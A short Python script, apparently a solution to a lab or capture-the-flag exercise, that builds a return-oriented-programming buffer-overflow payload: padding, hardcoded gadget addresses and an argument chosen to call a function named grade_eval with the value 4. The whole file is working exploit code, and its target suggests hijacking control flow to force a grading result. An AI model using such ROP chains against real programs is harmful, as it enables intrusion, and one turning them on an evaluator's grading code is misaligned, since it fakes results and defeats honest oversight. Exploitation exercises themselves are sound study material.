#!/usr/bin/env python3
"""Task 3: 用 ROP 调用 grade_eval(4)。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)

payload  = b"A" * 16
payload += p64(0)
payload += p64(0x401a33)
payload += p64(4)
payload += p64(0x401a34)
payload += p64(0x401978)
payload += p64(0x4141414141414141)

sys.stdout.buffer.write(payload)
